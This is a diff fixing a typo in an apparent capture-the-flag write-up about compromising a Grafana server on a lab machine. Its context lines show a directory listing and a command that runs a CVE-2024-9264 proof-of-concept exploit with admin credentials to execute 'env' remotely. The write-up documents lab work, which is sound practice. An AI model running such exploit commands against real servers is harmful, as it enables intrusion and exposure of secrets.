@@ -322,7 +322,7 @@ drwxr-xr-x 1 root root     4096 Apr 27  2024 ..
 -rwxr-xr-x 1 root root 49609088 Oct 14  2024 duckdb
 ```
 
-This confirmed us what type of binaries are available to us. Since we located the `grafana.db` file. But unfortunately this doesn't seems to be the right path since we the pocs we are not able to access the database informations.
+This confirmed us what type of binaries are available to us. Since we located the `grafana.db` file. But unfortunately this doesn't seems to be the right path since with the pocs we are not able to access the database informations.
 
 
 `python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "env" http://grafana.planning.htb`
